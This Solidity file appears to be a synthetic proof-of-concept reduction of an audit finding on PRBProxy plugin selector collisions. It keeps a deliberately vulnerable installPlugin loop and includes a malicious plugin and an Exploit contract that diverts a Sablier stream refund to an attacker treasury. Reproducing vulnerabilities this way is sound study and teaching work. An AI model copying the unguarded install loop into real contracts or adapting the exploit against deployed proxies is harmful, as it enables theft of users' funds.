// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sablier / PRBProxy — Plugins can be maliciously overridden by colliding
    signatures  (Zach Obront / Cantina Jul 2023, finding #54666)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: PRBProxyAnnex.installPlugin() maps each selector from
    plugin.methodList() to the plugin address WITHOUT checking whether that
    selector is already bound. An "innocent-looking" plugin can list the same
    4-byte selector as a legitimate Sablier plugin (onStreamCanceled) and
    silently replace it. When a stream is later canceled, control flow goes to
    the malicious plugin, which steals the refund instead of forwarding it to
    the proxy owner.

    Vulnerable install loop preserved with @> VULN marker.
    FIX: revert on selector collision. */

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

interface IPRBProxyPlugin {
    function methodList() external pure returns (bytes4[] memory);
}

/// @notice Reduced PRBProxy + Annex: plugin dispatch + installPlugin.
contract PRBProxyLike {
    address public owner;
    mapping(bytes4 => address) public plugins;

    constructor(address owner_) {
        owner = owner_;
    }

    /// @dev Install a plugin — VERBATIM reduction of PRBProxyAnnex.installPlugin
    ///      (PRBProxyAnnex.sol#L44-L64). No collision check.
    function installPlugin(IPRBProxyPlugin plugin) external {
        require(msg.sender == owner, "not owner");
        bytes4[] memory methodList = plugin.methodList();
        uint256 length = methodList.length;
        if (length == 0) {
            revert("PRBProxy_NoPluginMethods");
        }
        for (uint256 i = 0; i < length;) {
            // FIX: if (plugins[methodList[i]] != address(0)) revert collision;
            plugins[methodList[i]] = address(plugin); // @> VULN: no collision check — silent plugin override
            unchecked {
                i += 1;
            }
        }
    }

    fallback() external payable {
        address plugin = plugins[msg.sig];
        require(plugin != address(0), "no plugin");
        (bool ok, bytes memory ret) = plugin.delegatecall(msg.data);
        require(ok, string(ret));
    }

    receive() external payable {}
}

interface ISablierLike {
    function asset() external view returns (address);
}

interface IPRBProxyOwner {
    function owner() external view returns (address);
}

/// @notice Legitimate Sablier plugin: forward refund to proxy owner.
contract SablierPlugin is IPRBProxyPlugin {
    function methodList() external pure returns (bytes4[] memory methods) {
        methods = new bytes4[](1);
        methods[0] = this.onStreamCanceled.selector;
    }

    function onStreamCanceled(uint256, address, uint128 amount) external {
        MockToken asset = MockToken(ISablierLike(msg.sender).asset());
        address owner_ = IPRBProxyOwner(address(this)).owner();
        asset.transfer(owner_, amount);
    }
}

/// @notice Malicious plugin: same selector, sends refund to attacker treasury.
contract MaliciousPlugin is IPRBProxyPlugin {
    address public immutable treasury;

    constructor(address treasury_) {
        treasury = treasury_;
    }

    function methodList() external pure returns (bytes4[] memory methods) {
        methods = new bytes4[](1);
        methods[0] = this.onStreamCanceled.selector; // collision with SablierPlugin
    }

    function onStreamCanceled(uint256, address, uint128 amount) external {
        MockToken asset = MockToken(ISablierLike(msg.sender).asset());
        asset.transfer(treasury, amount);
    }
}

/// @notice Minimal Sablier lockup: cancel refunds proxy then hooks onStreamCanceled.
contract SablierLockupLike {
    MockToken public asset;
    uint128 public constant REFUND_AMOUNT = 1000e18;

    struct Stream {
        address sender;
        address recipient;
        uint128 deposit;
        bool canceled;
    }

    mapping(uint256 => Stream) public streams;
    uint256 public nextId = 1;

    constructor(MockToken asset_) {
        asset = asset_;
    }

    function create(address senderProxy, address recipient, uint128 amount) external returns (uint256 id) {
        asset.transferFrom(msg.sender, address(this), amount);
        id = nextId++;
        streams[id] = Stream({sender: senderProxy, recipient: recipient, deposit: amount, canceled: false});
    }

    function cancel(uint256 streamId) external {
        Stream storage s = streams[streamId];
        require(!s.canceled, "already canceled");
        require(msg.sender == s.recipient || msg.sender == s.sender, "not party");
        s.canceled = true;
        uint128 refund = s.deposit;
        asset.transfer(s.sender, refund);
        (bool ok,) = s.sender.call(
            abi.encodeWithSignature("onStreamCanceled(uint256,address,uint128)", streamId, s.sender, refund)
        );
        require(ok, "hook failed");
    }
}

/// @dev Proxy owner Alice — can install plugins.
contract Alice {
    function install(PRBProxyLike proxy, IPRBProxyPlugin plugin) external {
        proxy.installPlugin(plugin);
    }
}

contract AttackerTreasury {}

contract Recipient {
    function cancelStream(SablierLockupLike lockup, uint256 streamId) external {
        lockup.cancel(streamId);
    }
}

contract Exploit {
    MockToken public token; // CREATE nonce 1
    Alice public alice; // CREATE nonce 2
    PRBProxyLike public proxy; // CREATE nonce 3
    SablierPlugin public goodPlugin; // CREATE nonce 4
    AttackerTreasury public treasury; // CREATE nonce 5
    MaliciousPlugin public badPlugin; // CREATE nonce 6
    SablierLockupLike public lockup; // CREATE nonce 7
    Recipient public recipient; // CREATE nonce 8
    uint256 public streamId;

    uint128 public constant REFUND = 1000e18;

    constructor() {
        token = new MockToken();
        alice = new Alice();
        proxy = new PRBProxyLike(address(alice));
        goodPlugin = new SablierPlugin();
        treasury = new AttackerTreasury();
        badPlugin = new MaliciousPlugin(address(treasury));
        lockup = new SablierLockupLike(token);
        recipient = new Recipient();
        token.mint(address(this), REFUND);
    }

    function run() external {
        // 1. Alice installs the legitimate Sablier plugin.
        alice.install(proxy, goodPlugin);
        require(
            proxy.plugins(SablierPlugin.onStreamCanceled.selector) == address(goodPlugin), "good not installed"
        );

        // 2. Create stream: proxy is sender.
        streamId = lockup.create(address(proxy), address(recipient), REFUND);

        // 3. "Innocent" plugin installed — silently overrides onStreamCanceled.
        alice.install(proxy, badPlugin);
        require(
            proxy.plugins(SablierPlugin.onStreamCanceled.selector) == address(badPlugin), "override failed"
        );

        uint256 aliceBefore = token.balanceOf(address(alice));
        uint256 treasuryBefore = token.balanceOf(address(treasury));

        // 4. Recipient cancels → refund to proxy → malicious plugin steals.
        recipient.cancelStream(lockup, streamId);

        // HARM: Alice got nothing; attacker treasury got the full refund.
        require(token.balanceOf(address(alice)) == aliceBefore, "alice should get nothing");
        require(
            token.balanceOf(address(treasury)) == treasuryBefore + REFUND, "attacker did not steal refund"
        );
        require(token.balanceOf(address(proxy)) == 0, "proxy should be empty");
    }
}
